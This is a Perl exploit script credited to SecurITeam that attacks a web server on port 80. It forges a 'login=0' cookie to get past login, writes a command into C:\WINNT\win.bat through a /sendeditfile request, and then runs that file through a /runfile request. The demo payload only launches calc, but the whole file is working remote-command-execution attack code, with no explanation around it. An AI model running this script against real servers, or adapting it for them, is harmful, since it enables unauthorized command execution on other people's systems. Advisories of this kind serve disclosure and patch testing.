#!/usr/bin/perl
#
# Exploit by SecurITeam
use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 host ..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto => "tcp",
PeerAddr => $host,
PeerPort => "http(80)",
);
unless ($remote) { die "cannot connect to http daemon on $host" }

$remote->autoflush(1);

$request = "POST /sendeditfile HTTP/1.1\r\
Accept: */*\r\
Referer: http://$;host/editfile=?C:\\WINNT\\win.bat?\r\
Content-Type: application/x-www-form-urlencoded\r\
Host: $host\r\
Connection: close\r\
Content-Length: 25\r\
Cookie: login=0\r\
\r\
newfiledata=cmd+%2Fc+calc";

print $remote $request;

sleep(1);

$MAXLEN = 256;

if ($remote->recv($newmsg, $MAXLEN))
{
print "Result: $newmsg\n";
} 

sleep(1);

close $remote;

#---- 

$remote = IO::Socket::INET->new( Proto => "tcp",
PeerAddr => $host,
PeerPort => "http(80)",
);
unless ($remote) { die "cannot connect to http daemon on $host" }

$remote->autoflush(1);

$request = "GET /runfile=?C:\\WINNT\\win.bat? HTTP/1.1\r\
Accept: */*\r\
Host: AnyHostWillDo\r\
Cookie: login=0\r\
\r\n";

print $remote $request;

sleep(1);

$MAXLEN = 256;

if ($remote->recv($newmsg, $MAXLEN))
{
print "Result: $newmsg\n";
} 

sleep(1);